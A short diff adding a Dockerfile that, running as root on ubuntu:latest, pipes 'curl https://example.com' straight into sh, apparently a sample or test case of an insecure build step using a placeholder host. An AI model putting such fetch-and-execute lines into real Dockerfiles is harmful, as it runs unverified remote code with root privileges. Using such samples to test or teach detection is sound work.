@@ -1,0 +1,4 @@
+FROM ubuntu:latest
+USER root
+RUN curl https://example.com | sh
+CMD echo ready
